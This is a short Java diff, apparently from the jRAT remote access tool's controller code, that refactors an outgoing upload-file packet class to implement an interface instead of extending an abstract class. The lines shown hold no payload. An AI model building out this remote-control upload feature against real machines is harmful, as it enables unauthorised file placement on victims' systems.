@@ -5,7 +5,7 @@ import jrat.controller.threads.ThreadUploadFile;
 
 import java.io.File;
 
-public class Packet42ServerUploadFile extends AbstractOutgoingPacket {
+public class Packet42ServerUploadFile implements OutgoingPacket {
 
 	protected File file;
 	protected String remoteFile;
